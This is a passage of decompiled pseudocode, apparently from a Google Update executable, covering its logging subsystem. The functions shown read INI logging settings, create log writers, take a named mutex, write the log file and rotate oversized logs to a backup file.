    FUN_00404d7b(param_1 + 0x80,extraout_DX,(int)L"GoogleUpdate.log");
  }
  else {
    UVar4 = GetPrivateProfileIntW(L"LoggingSettings",L"EnableLogging",1,local_8);
    param_1[0x7c] = UVar4 != 0;
    UVar4 = GetPrivateProfileIntW(L"LoggingSettings",L"ShowTime",1,local_8);
    param_1[0x7e] = UVar4 != 0;
    UVar4 = GetPrivateProfileIntW(L"LoggingSettings",L"LogToFile",0,local_8);
    param_1[0x7f] = UVar4 != 0;
    UVar4 = GetPrivateProfileIntW(L"LoggingSettings",L"LogToOutputDebug",0,local_8);
    param_1[0x84] = UVar4 != 0;
    UVar4 = GetPrivateProfileIntW(L"LoggingSettings",L"AppendToFile",1,local_8);
    this = (LPWSTR *)(param_1 + 0x80);
    param_1[0x85] = UVar4 != 0;
    if ((int)(1U - *(int *)(*this + -2) | *(int *)(*this + -4) - 0x104U) < 0) {
      ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)this,0x104);
    }
    GetPrivateProfileStringW
              (L"LoggingSettings",L"LogFilePath",L"GoogleUpdate.log",*this,0x104,local_8);
    ReleaseBuffer((int *)this,extraout_EDX,-1);
  }
  if (param_1[0x7d] != '\0') {
    param_1[0x7e] = 1;
  }
  *param_1 = 1;
  *(undefined4 *)(param_1 + 4) = 7;
  local_8 = (LPCWSTR)0x0;
  do {
    lpKeyName = *(LPCWSTR *)((int)&PTR_u_LC_UTIL_004364e0 + (int)local_8);
    uVar1 = *(uint *)((int)&DAT_004364e4 + (int)local_8);
    if ((lpKeyName != (LPCWSTR)0x0) && (uVar1 < 0xb)) {
      FUN_00406049(param_1,(int *)&local_c);
      pWVar2 = local_c;
      if (*(int *)(local_c + -6) == 0) {
        UVar4 = 1;
      }
      else {
        UVar4 = GetPrivateProfileIntW(L"LoggingLevel",lpKeyName,1,local_c);
      }
      param_1[uVar1 * 8] = UVar4 != 0;
      *(UINT *)(param_1 + uVar1 * 8 + 4) = UVar4;
      FUN_00401df0((int **)(pWVar2 + -8));
    }
    local_8 = local_8 + 4;
  } while (local_8 < (LPCWSTR)0x50);
  uVar5 = FUN_00407c01();
  *(int *)(param_1 + 0x88) = (int)uVar5;
  *(int *)(param_1 + 0x8c) = (int)((ulonglong)uVar5 >> 0x20);
  FUN_00401df0((int **)(pWVar3 + -8));
  return;
}



undefined4 * FUN_004055b5(undefined4 *param_1)

{
  int *piVar1;
  int iVar2;
  BOOL BVar3;
  int **ppiVar4;
  int extraout_EDX;
  int extraout_EDX_00;
  LPWSTR local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  if ((int)(1U - *(int *)(local_8 + -2) | *(int *)(local_8 + -4) - 0x104U) < 0) {
    ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
  }
  iVar2 = SHGetFolderPathW(0,0x23,0,0,local_8);
  if ((-1 < iVar2) && (BVar3 = PathAppendW(local_8,L"Google\\Update\\Log"), BVar3 != 0)) {
    ppiVar4 = FUN_00401aca((int **)(local_8 + -8));
    *param_1 = ppiVar4 + 4;
    ReleaseBuffer((int *)&local_8,extraout_EDX_00,-1);
    FUN_00401df0((int **)(local_8 + -8));
    return param_1;
  }
  FUN_00404cfa(param_1,(HMODULE)&DAT_0042f178);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  FUN_00401df0((int **)(local_8 + -8));
  return param_1;
}



int * __thiscall FUN_0040565f(void *this,int *param_1)

{
  LPCWSTR pMore;
  int *piVar1;
  BOOL BVar2;
  int **ppiVar3;
  int extraout_EDX;
  LPWSTR pWVar4;
  LPWSTR local_8;
  
  local_8 = (LPWSTR)this;
  if (*(int *)(*(LPCWSTR *)((int)this + 0x80) + -6) == 0) {
    piVar1 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar1);
  }
  else {
    BVar2 = PathIsRelativeW(*(LPCWSTR *)((int)this + 0x80));
    if (BVar2 == 0) {
      ppiVar3 = FUN_00401aca((int **)(*(int *)((int)this + 0x80) + -0x10));
      *param_1 = (int)(ppiVar3 + 4);
    }
    else {
      FUN_004055b5(&local_8);
      pWVar4 = local_8;
      if (*(int *)(local_8 + -6) != 0) {
        pMore = *(LPCWSTR *)((int)this + 0x80);
        if ((int)(1U - *(int *)(local_8 + -2) | *(int *)(local_8 + -4) - 0x104U) < 0) {
          ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
        }
        pWVar4 = local_8;
        BVar2 = PathAppendW(local_8,pMore);
        ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
        if (BVar2 != 0) {
          ppiVar3 = FUN_00401aca((int **)(pWVar4 + -8));
          *param_1 = (int)(ppiVar3 + 4);
          FUN_00401df0((int **)(pWVar4 + -8));
          return param_1;
        }
      }
      piVar1 = (int *)FUN_0040139e();
      CSimpleStringT__(param_1,piVar1);
      FUN_00401df0((int **)(pWVar4 + -8));
    }
  }
  return param_1;
}



void __fastcall FUN_00405743(HMODULE param_1)

{
  HMODULE pHVar1;
  HMODULE pHVar2;
  DWORD DVar3;
  undefined4 *puVar4;
  LPWSTR lpOutputString;
  undefined4 extraout_ECX;
  int extraout_EDX;
  int iVar5;
  undefined8 uVar6;
  undefined4 uVar7;
  HMODULE local_c;
  HMODULE local_8;
  
  if (*(char *)((int)&param_1[0x1f].unused + 3) == '\0') {
    return;
  }
  local_c = param_1;
  local_8 = param_1;
  if (param_1[0x35].unused == 0) {
    FUN_0040565f(param_1,(int *)&local_8);
    pHVar2 = local_8;
    if (local_8[-3].unused != 0) {
      FUN_00408710(&local_c,&local_8);
      pHVar1 = local_c;
      uVar6 = FUN_00407e50((LPCWSTR)local_c);
      if (((char)uVar6 != '\0') || (DVar3 = FUN_0040233f((LPCWSTR)pHVar1), -1 < (int)DVar3)) {
        uVar7 = 0x20;
        local_c = (HMODULE)((uint)local_c & 0xffffff00 |
                           (uint)*(byte *)((int)&param_1[0x21].unused + 1));
        uVar6 = FUN_00416f82(0x20);
        iVar5 = (int)((ulonglong)uVar6 >> 0x20);
        if ((void *)uVar6 == (void *)0x0) {
          puVar4 = (undefined4 *)0x0;
        }
        else {
          puVar4 = FUN_004060b9((void *)uVar6,pHVar2,(LPCWSTR)local_c);
          uVar7 = extraout_ECX;
          iVar5 = extraout_EDX;
        }
        param_1[0x35].unused = (int)puVar4;
        if (puVar4 == (undefined4 *)0x0) {
          lpOutputString =
               FUN_00408b32(uVar7,iVar5,L"LOG_SYSTEM: [%s]: ERROR - Cannot create log writer to %s")
          ;
          OutputDebugStringW(lpOutputString);
        }
        FUN_00401df0((int **)(pHVar1 + -4));
        FUN_00401df0((int **)(pHVar2 + -4));
        goto LAB_00405802;
      }
      FUN_00401df0((int **)(pHVar1 + -4));
    }
    FUN_00401df0((int **)(pHVar2 + -4));
  }
  else {
LAB_00405802:
    if (param_1[0x35].unused != 0) {
      FUN_00405fd6(param_1,param_1[0x35].unused);
    }
  }
  return;
}



bool __fastcall FUN_0040581b(HMODULE param_1)

{
  undefined4 *puVar1;
  LPWSTR pWVar2;
  undefined4 extraout_ECX;
  int extraout_EDX;
  int iVar3;
  undefined8 uVar4;
  undefined4 uVar5;
  
  if (param_1[0x37].unused == 0) {
    uVar5 = 0x40;
    uVar4 = FUN_00416f82(0x40);
    iVar3 = (int)((ulonglong)uVar4 >> 0x20);
    if ((undefined4 *)uVar4 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)0x0;
    }
    else {
      puVar1 = FUN_00408cd4((undefined4 *)uVar4);
      uVar5 = extraout_ECX;
      iVar3 = extraout_EDX;
    }
    param_1[0x37].unused = (int)puVar1;
    if (puVar1 == (undefined4 *)0x0) {
      pWVar2 = FUN_00408b32(uVar5,iVar3,L"LOG_SYSTEM: [%s]: ERROR - Cannot create ETW log writer");
      OutputDebugStringW(pWVar2);
    }
  }
  if (param_1[0x37].unused != 0) {
    FUN_00405fd6(param_1,param_1[0x37].unused);
  }
  FUN_00405743(param_1);
  if (*(char *)&param_1[0x21].unused != '\0') {
    if (param_1[0x36].unused == 0) {
      uVar5 = 4;
      uVar4 = FUN_00416f82(4);
      puVar1 = (undefined4 *)uVar4;
      if (puVar1 == (undefined4 *)0x0) {
        puVar1 = (undefined4 *)0x0;
      }
      else {
        *puVar1 = &PTR_LAB_0042fa68;
      }
      param_1[0x36].unused = (int)puVar1;
      if (puVar1 == (undefined4 *)0x0) {
        pWVar2 = FUN_00408b32(uVar5,(int)((ulonglong)uVar4 >> 0x20),
                              L"LOG_SYSTEM: [%s]: ERROR - Cannot create OutputDebugString log writer"
                             );
        OutputDebugStringW(pWVar2);
      }
    }
    if (param_1[0x36].unused != 0) {
      FUN_00405fd6(param_1,param_1[0x36].unused);
    }
  }
  return 0 < param_1[0x25].unused;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

uint __fastcall FUN_004058df(HMODULE param_1)

{
  bool bVar1;
  uint in_EAX;
  LPWSTR lpOutputString;
  uint uVar2;
  undefined3 extraout_var;
  undefined4 extraout_ECX;
  int extraout_EDX;
  int local_2c [8];
  undefined4 uStack12;
  undefined4 local_8;
  
  uStack12 = 0x4058eb;
  local_8 = 0;
  if (*(char *)((int)&param_1[0x21].unused + 2) == '\x01') {
    FUN_004050c3(local_2c);
    lpOutputString =
         FUN_00408b32(extraout_ECX,extraout_EDX,
                      L"LOG_SYSTEM: [%s]: ERROR - Calling the logging system after it has been shut down \n"
                     );
    OutputDebugStringW(lpOutputString);
    in_EAX = FUN_00401e0c(local_2c);
LAB_004059cb:
    uVar2 = in_EAX & 0xffffff00;
  }
  else {
    if (*(char *)&param_1[0x16].unused != '\x01') {
      if (*(char *)((int)&param_1[0x16].unused + 1) != '\0') goto LAB_004059cb;
      *(undefined *)((int)&param_1[0x16].unused + 1) = 1;
      in_EAX = FUN_00405401((undefined *)param_1);
      if (*(char *)&param_1[0x1f].unused != '\0') {
        bVar1 = FUN_0040581b(param_1);
        in_EAX = CONCAT31(extraout_var,bVar1);
        *(bool *)&param_1[0x16].unused = bVar1;
      }
      *(undefined *)((int)&param_1[0x16].unused + 1) = 0;
    }
    uVar2 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar2;
}



uint __fastcall FUN_004059da(HMODULE param_1)

{
  undefined4 in_EAX;
  LPWSTR lpOutputString;
  uint uVar1;
  uint uVar2;
  undefined4 extraout_ECX;
  int extraout_EDX;
  HMODULE local_c;
  HMODULE local_8;
  
  local_c = param_1;
  local_8 = param_1;
  if (*(char *)((int)&param_1[0x21].unused + 2) == '\x01') {
    FUN_004050c3(&local_8);
    lpOutputString =
         FUN_00408b32(extraout_ECX,extraout_EDX,
                      L"LOG_SYSTEM: [%s]: ERROR - Calling the logging system after it has been shut down \n"
                     );
    OutputDebugStringW(lpOutputString);
    uVar1 = FUN_00401df0((int **)(local_8 + -4));
    uVar1 = uVar1 & 0xffffff00;
  }
  else if (*(char *)&param_1[0x16].unused == '\x01') {
    uVar1 = CONCAT31((int3)((uint)in_EAX >> 8),1);
  }
  else {
    FUN_004069d2(&local_c,&param_1[0x18].unused);
    uVar1 = FUN_004058df(param_1);
    uVar2 = (**(code **)(local_8->unused + 8))();
    uVar1 = uVar2 & 0xffffff00 | uVar1 & 0xff;
  }
  return uVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __fastcall FUN_00405a47(HMODULE param_1)

{
  uint uVar1;
  
  uVar1 = FUN_004059da(param_1);
  if ((char)uVar1 != '\0') {
    (**(code **)(param_1[0x18].unused + 4))();
    if (*(char *)&param_1[0x1f].unused == '\0') {
      FUN_0040581b(param_1);
      *(undefined *)&param_1[0x1f].unused = 1;
    }
    (**(code **)(param_1[0x18].unused + 8))();
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __fastcall FUN_00405af7(HMODULE param_1)

{
  uint uVar1;
  
  uVar1 = FUN_004059da(param_1);
  if ((char)uVar1 != '\0') {
    (**(code **)(param_1[0x18].unused + 4))();
    if (*(char *)&param_1[0x1f].unused != '\0') {
      *(undefined *)&param_1[0x1f].unused = 0;
      if (param_1[0x37].unused != 0) {
        FUN_00405ffe(param_1,param_1[0x37].unused);
      }
      if (param_1[0x35].unused != 0) {
        FUN_00405ffe(param_1,param_1[0x35].unused);
      }
      if (param_1[0x36].unused != 0) {
        FUN_00405ffe(param_1,param_1[0x36].unused);
      }
    }
    (**(code **)(param_1[0x18].unused + 8))();
  }
  return;
}



void FUN_00405baf(void)

{
  return;
}



// WARNING: Removing unreachable block (ram,0x00405c18)

uint __thiscall FUN_00405bda(void *this,undefined4 param_1,int param_2)

{
  char cVar1;
  uint uVar2;
  int **ppiVar3;
  int iVar4;
  ulonglong uVar5;
  
  uVar2 = FUN_004059da((HMODULE)this);
  if ((char)uVar2 != '\0') {
    cVar1 = *(char *)((int)this + 0x7c);
    uVar5 = FUN_00407c01();
    uVar2 = 0;
    if (CONCAT44(*(int *)((int)this + 0x8c) + (uint)(0xfd050f7f < *(uint *)((int)this + 0x88)),
                 *(uint *)((int)this + 0x88) + 50000000) < uVar5) {
      FUN_00405401((undefined *)this);
    }
    if (cVar1 != *(char *)((int)this + 0x7c)) {
      if (*(char *)((int)this + 0x7c) == '\0') {
        FUN_00405af7((HMODULE)this);
      }
      else {
        FUN_00405a47((HMODULE)this);
      }
    }
    if (*(char *)((int)this + 0x7c) != '\0') {
      if ((*(char *)((int)this + 0x40) != '\0') && (param_2 <= *(int *)((int)this + 0x44))) {
        return 0xffffffff;
      }
      iVar4 = *(int *)((int)this + 0x94) + -1;
      if (iVar4 < 0) {
        return 0;
      }
      ppiVar3 = (int **)((int)this + iVar4 * 4 + 0x98);
      do {
        uVar2 = uVar2 * 2;
        if ((*ppiVar3 != (int *)0x0) &&
           (cVar1 = (**(code **)(**ppiVar3 + 0xc))(8,param_2), cVar1 != '\0')) {
          uVar2 = uVar2 | 1;
        }
        ppiVar3 = ppiVar3 + -1;
        iVar4 = iVar4 + -1;
      } while (-1 < iVar4);
      return uVar2;
    }
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __thiscall
FUN_00405c98(void *this,uint param_1,int param_2,undefined4 param_3,int *param_4,int *param_5)

{
  char *pcVar1;
  int extraout_ECX;
  undefined2 extraout_DX;
  int extraout_EDX;
  char *pcVar2;
  int local_30;
  undefined4 local_2c;
  int local_28;
  int local_24;
  char *local_20;
  undefined4 uStack12;
  undefined4 local_8;
  
  uStack12 = 0x405ca4;
  local_8 = 0;
  pcVar2 = (char *)0x200;
  while( true ) {
    local_20 = pcVar2;
    pcVar1 = GetBufferSetLength(param_4,(int)pcVar2);
    FUN_004235a2(extraout_ECX,extraout_DX);
    if ((pcVar1 != (char *)0xffffffff) || (pcVar1 = pcVar2, (char *)0xfffff < pcVar2)) break;
    pcVar2 = (char *)((int)pcVar2 * 2);
  }
  ReleaseBuffer(param_4,extraout_EDX,(int)pcVar1);
  FUN_00405150(*(char *)((int)this + 0x7e),param_5);
  local_24 = *param_4;
  local_28 = *param_5;
  local_30 = param_2;
  local_2c = param_3;
  FUN_00405edd((int)this,(short)local_24,param_1,&local_30);
  return;
}



void __thiscall
FUN_00405d60(void *this,uint param_1,int param_2,int param_3,LPCWSTR param_4,undefined4 param_5)

{
  LPCWSTR lpOutputString;
  char cVar1;
  int *piVar2;
  int iVar3;
  void *local_8;
  
  lpOutputString = param_4;
  if ((param_4 != (LPCWSTR)0x0) && ((param_1 != 0 || (param_3 < 3)))) {
    local_8 = this;
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_8,piVar2);
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(&param_4,piVar2);
    iVar3 = 1;
    do {
      cVar1 = (**(code **)(*(int *)((int)this + 0x60) + 0xc))(0);
      if (cVar1 != '\0') {
        FUN_00405c98(this,param_1,param_2,param_3,(int *)&local_8,(int *)&param_4);
        (**(code **)(*(int *)((int)this + 0x60) + 8))();
        break;
      }
      Sleep(0x32);
      iVar3 = iVar3 + 1;
    } while (iVar3 < 0x15);
    if (0x14 < iVar3) {
      OutputDebugStringA("LOG_SYSTEM: Couldn\'t acquire lock - ");
      OutputDebugStringW(lpOutputString);
      OutputDebugStringW(L"\n\r");
    }
    FUN_00401df0((int **)(param_4 + -8));
    FUN_00401df0((int **)((int)local_8 + -0x10));
  }
  return;
}



void __fastcall FUN_00405e27(undefined4 param_1,undefined2 param_2,void *param_3)

{
  size_t _Size;
  int iVar1;
  
  iVar1 = FUN_0041c12a(param_1,param_2);
  if (iVar1 != 0) {
    if (iVar1 < 0x400) {
      if (DAT_00437b6c + iVar1 < 0x400) {
        FID_conflict__memcpy(&DAT_00438040 + DAT_00437b6c * 2,param_3,iVar1 * 2);
        DAT_00437b6c = DAT_00437b6c + iVar1;
      }
      else {
        iVar1 = iVar1 - (0x400 - DAT_00437b6c);
        _Size = (0x400 - DAT_00437b6c) * 2;
        FID_conflict__memcpy(&DAT_00438040 + DAT_00437b6c * 2,param_3,_Size);
        DAT_00437b69 = 1;
        DAT_00437b6c = iVar1;
        if (iVar1 != 0) {
          FID_conflict__memcpy(&DAT_00438040,(void *)(_Size + (int)param_3),iVar1 * 2);
        }
      }
    }
    else {
      FID_conflict__memcpy(&DAT_00438040,param_3,0x800);
      DAT_00437b69 = 1;
      DAT_00437b6c = 0;
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __fastcall FUN_00405edd(int param_1,undefined2 param_2,uint param_3,int *param_4)

{
  char cVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  int local_24;
  
  if ((param_4[1] < 3) && (*param_4 == 10)) {
    FUN_00405e27(param_1,param_2,(void *)param_4[2]);
    FUN_00405e27(extraout_ECX,extraout_DX,(void *)param_4[3]);
    FUN_00405e27(extraout_ECX_00,extraout_DX_00,&DAT_0042f748);
  }
  for (local_24 = 0; local_24 < *(int *)(param_1 + 0x94); local_24 = local_24 + 1) {
    if (((param_3 & 1) != 0) &&
       ((*(char *)(param_1 + 0x7c) != '\0' ||
        (cVar1 = (**(code **)(**(int **)(param_1 + 0x98 + local_24 * 4) + 8))(), cVar1 != '\0')))) {
      (**(code **)(**(int **)(param_1 + 0x98 + local_24 * 4) + 0x10))(param_4);
    }
    param_3 = param_3 >> 1;
  }
  return;
}



bool __thiscall FUN_00405fd6(void *this,undefined4 param_1)

{
  int iVar1;
  
  iVar1 = *(int *)((int)this + 0x94);
  if (iVar1 < 0xf) {
    *(undefined4 *)((int)this + iVar1 * 4 + 0x98) = param_1;
    *(int *)((int)this + 0x94) = *(int *)((int)this + 0x94) + 1;
  }
  return iVar1 < 0xf;
}



undefined4 __thiscall FUN_00405ffe(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  int *piVar4;
  
  iVar1 = *(int *)((int)this + 0x94);
  iVar3 = 0;
  if (0 < iVar1) {
    piVar4 = (int *)((int)this + 0x98);
    do {
      if (*piVar4 == param_1) {
        *(int *)((int)this + 0x94) = iVar1 + -1;
        uVar2 = *(undefined4 *)((int)this + (iVar1 + -1) * 4 + 0x98);
        *(undefined4 *)((int)this + iVar3 * 4 + 0x98) = uVar2;
        return CONCAT31((int3)((uint)uVar2 >> 8),1);
      }
      iVar3 = iVar3 + 1;
      piVar4 = piVar4 + 1;
    } while (iVar3 < iVar1);
  }
  return 0;
}



int * __thiscall FUN_00406049(void *this,int *param_1)

{
  int **ppiVar1;
  undefined8 uVar2;
  
  if ((*(int *)(*(LPCWSTR *)((int)this + 0x90) + -6) != 0) &&
     (uVar2 = FUN_00407e50(*(LPCWSTR *)((int)this + 0x90)), (char)uVar2 != '\0')) {
    ppiVar1 = FUN_00401aca((int **)(*(int *)((int)this + 0x90) + -0x10));
    *param_1 = (int)(ppiVar1 + 4);
    return param_1;
  }
  FUN_00404cfa(param_1,(HMODULE)&DAT_0042f178);
  return param_1;
}



undefined4 * __thiscall FUN_00406091(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_LAB_0042fa90;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_004060b9(void *this,HMODULE param_1,LPCWSTR param_2)

{
  LPCWSTR lpFileName;
  int *piVar1;
  void *this_00;
  UINT UVar2;
  
  *(undefined ***)this = &PTR_FUN_0042fa7c;
  *(undefined4 *)((int)this + 4) = 10000000;
  *(undefined2 *)((int)this + 8) = 0;
  *(undefined *)((int)this + 10) = param_2._0_1_;
  *(undefined *)((int)this + 0xb) = 1;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__((void *)((int)this + 0xc),piVar1);
  *(undefined4 *)((int)this + 0x10) = 0;
  FUN_00404cfa((void *)((int)this + 0x14),param_1);
  *(undefined4 *)((int)this + 0x18) = 0;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__((void *)((int)this + 0x1c),piVar1);
  this_00 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (this_00 != (void *)0x0) {
    FUN_00406049(this_00,(int *)&param_2);
    lpFileName = param_2;
    if (*(int *)(param_2 + -6) == 0) {
      *(undefined4 *)((int)this + 4) = 10000000;
      *(undefined *)((int)this + 0xb) = 1;
    }
    else {
      UVar2 = GetPrivateProfileIntW(L"LoggingSettings",L"MaxLogFileSize",10000000,param_2);
      *(UINT *)((int)this + 4) = UVar2;
      UVar2 = GetPrivateProfileIntW(L"LoggingSettings",L"LogFileWide",1,lpFileName);
      *(bool *)((int)this + 0xb) = UVar2 != 0;
    }
    FUN_00401b2a((void *)((int)this + 0x1c),(int *)((int)this_00 + 0x5c));
    FUN_00401df0((int **)(lpFileName + -8));
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00406194(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042fa7c;
  FUN_00406267((int)this);
  FUN_00401df0((int **)(*(int *)((int)this + 0x1c) + -0x10));
  FUN_00401df0((int **)(*(int *)((int)this + 0x14) + -0x10));
  FUN_00401df0((int **)(*(int *)((int)this + 0xc) + -0x10));
  *(undefined ***)this = &PTR_LAB_0042fa90;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_004061e0(LPCWSTR param_1)

{
  uint uVar1;
  undefined4 uVar2;
  LPWSTR pWVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int extraout_EDX;
  undefined8 uVar4;
  
  if (*(char *)(param_1 + 4) == '\0') {
    *(undefined *)(param_1 + 4) = 1;
    uVar1 = FUN_00406293((int)param_1);
    if (*(int *)(param_1 + 8) != 0) {
      if ((char)uVar1 != '\0') {
        *(undefined *)(param_1 + 5) = 1;
      }
      uVar2 = FUN_00406807((int)param_1);
      if ((char)uVar2 == '\0') {
        pWVar3 = FUN_00408b32(extraout_ECX,extraout_EDX,
                              L"LOG_SYSTEM: [%s]: Could not acquire logging mutex %s\n");
        OutputDebugStringW(pWVar3);
        return;
      }
      uVar4 = FUN_0040635a(param_1);
      if (*(int *)(param_1 + 0xc) == 0) {
        pWVar3 = FUN_00408b32(extraout_ECX_00,(int)((ulonglong)uVar4 >> 0x20),
                              L"LOG_SYSTEM: [%s]: Could not create logging file %s\n");
        OutputDebugStringW(pWVar3);
        *(undefined *)((int)param_1 + 9) = 0;
      }
      *(undefined *)((int)param_1 + 9) = 1;
      if (*(int *)(param_1 + 8) != 0) {
        ReleaseMutex(*(HANDLE *)(param_1 + 8));
      }
    }
  }
  return;
}



void __fastcall FUN_00406267(int param_1)

{
  if (*(int *)(param_1 + 0x18) != 0) {
    CloseHandle(*(HANDLE *)(param_1 + 0x18));
  }
  if (*(int *)(param_1 + 0x10) != 0) {
    ReleaseMutex(*(HANDLE *)(param_1 + 0x10));
    CloseHandle(*(HANDLE *)(param_1 + 0x10));
  }
  return;
}



uint __fastcall FUN_00406293(int param_1)

{
  short **ppsVar1;
  int *piVar2;
  int iVar3;
  DWORD DVar4;
  uint uVar5;
  uint uVar6;
  _SECURITY_ATTRIBUTES local_28;
  undefined **local_1c;
  undefined4 local_18;
  undefined **local_14;
  PSECURITY_DESCRIPTOR local_10;
  int local_c;
  int local_8;
  
  ppsVar1 = (short **)
            FUN_00406875(&local_c,(int)L"_Google_Update_logging_mutex_",(int *)(param_1 + 0x14));
  piVar2 = FUN_0040502d(&local_8,ppsVar1);
  FUN_00401b2a((void *)(param_1 + 0xc),piVar2);
  FUN_00401df0((int **)(local_8 + -0x10));
  FUN_00401df0((int **)(local_c + -0x10));
  uVar6 = 0;
  local_14 = &PTR_FUN_0042f168;
  local_10 = (PSECURITY_DESCRIPTOR)0x0;
  FUN_00401eed((int *)&local_14);
  local_1c = &PTR_FUN_0042f168;
  local_18 = 0;
  if (local_10 != (PSECURITY_DESCRIPTOR)0x0) {
    FUN_00403201(&local_1c,local_10);
  }
  FUN_00403299(&local_28,(int *)&local_1c);
  iVar3 = FUN_004069a2(*(LPCWSTR *)(param_1 + 0xc),&local_28);
  *(int *)(param_1 + 0x10) = iVar3;
  if (iVar3 != 0) {
    DVar4 = GetLastError();
    uVar6 = (uint)(DVar4 == 0xb7);
  }
  local_1c = &PTR_FUN_0042f168;
  FUN_00404a5c(&local_1c);
  local_14 = &PTR_FUN_0042f168;
  uVar5 = FUN_00404a5c(&local_14);
  return uVar5 & 0xffffff00 | uVar6;
}



undefined8 __fastcall FUN_0040635a(LPCWSTR param_1)

{
  HANDLE pvVar1;
  uint uVar2;
  DWORD DVar3;
  undefined8 uVar4;
  int local_90 [8];
  uint local_70;
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_70 = 0;
  FUN_00407f87(*(LPCWSTR *)(param_1 + 10),&local_70);
  if (*(uint *)(param_1 + 2) <= local_70 && local_70 != *(uint *)(param_1 + 2)) {
    FUN_004064c8(param_1);
  }
  pvVar1 = CreateFileW(*(LPCWSTR *)(param_1 + 10),0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,
                       (uint)(*(char *)(param_1 + 5) != '\0') * 2 + 2,0x80,(HANDLE)0x0);
  *(HANDLE *)(param_1 + 0xc) = pvVar1;
  if (pvVar1 == (HANDLE)0xffffffff) {
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  else {
    FUN_004049e3(local_90);
    FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
    uVar2 = FUN_0040442b(local_90,local_6c,0xc0010000,0);
    FUN_00404961(local_6c);
    if ((char)uVar2 != '\0') {
      FUN_00403189(*(void **)(param_1 + 10),local_90);
    }
    DVar3 = GetLastError();
    if ((DVar3 != 0xb7) && (*(char *)((int)param_1 + 0xb) != '\0')) {
      local_70 = 0;
      WriteFile(*(HANDLE *)(param_1 + 0xc),&DAT_0042da9c,2,&local_70,(LPOVERLAPPED)0x0);
    }
    FUN_004044af(local_90);
  }
  uVar4 = FUN_0041a954();
  return uVar4;
}



uint __fastcall FUN_0040646d(DWORD param_1)

{
  HANDLE hFile;
  uint uVar1;
  BOOL BVar2;
  DWORD local_8;
  
  local_8 = param_1;
  hFile = CreateFileW(*(LPCWSTR *)(param_1 + 0x14),0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,5,0x80,
                      (HANDLE)0x0);
  if (*(int *)(param_1 + 0x18) == -1) {
    uVar1 = (uint)hFile & 0xffffff00;
  }
  else {
    if (*(char *)(param_1 + 0xb) != '\0') {
      local_8 = 0;
      WriteFile(hFile,&DAT_0042da9c,2,&local_8,(LPOVERLAPPED)0x0);
    }
    BVar2 = CloseHandle(hFile);
    uVar1 = CONCAT31((int3)((uint)BVar2 >> 8),1);
  }
  return uVar1;
}



uint __fastcall FUN_004064c8(LPCWSTR param_1)

{
  LPCWSTR *ppWVar1;
  LPCWSTR pWVar2;
  BOOL BVar3;
  DWORD DVar4;
  uint uVar5;
  uint uVar6;
  undefined8 uVar7;
  LPCWSTR local_8;
  
  local_8 = param_1;
  OutputDebugStringW(L"LOG_SYSTEM: trying to move log file to backup\n");
  ppWVar1 = (LPCWSTR *)(param_1 + 10);
  FUN_00404f5b(&local_8,(int *)ppWVar1,(int)L".bak");
  pWVar2 = local_8;
  BVar3 = MoveFileExW(*ppWVar1,local_8,0xb);
  uVar6 = 0;
  if (BVar3 == 0) {
    DVar4 = FUN_00407e13();
  }
  else {
    DVar4 = 0;
  }
  if ((int)DVar4 < 0) {
    OutputDebugStringW(L"LOG_SYSTEM: failed to move log file to backup\n");
    uVar7 = FUN_00406549();
    if ((char)uVar7 == '\0') {
      FUN_00407ee3(*ppWVar1,pWVar2);
    }
  }
  else {
    uVar6 = 1;
  }
  uVar5 = FUN_00401df0((int **)(pWVar2 + -8));
  return uVar5 & 0xffffff00 | uVar6;
}



undefined8 FUN_00406549(void)

{
  LSTATUS LVar1;
  uint *lpData;
  int iVar2;
  undefined4 extraout_ECX;
  int extraout_EDX;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  uint uVar6;
  undefined8 uVar7;
  DWORD local_7c;
  LPCWSTR local_78;
  HKEY local_74;
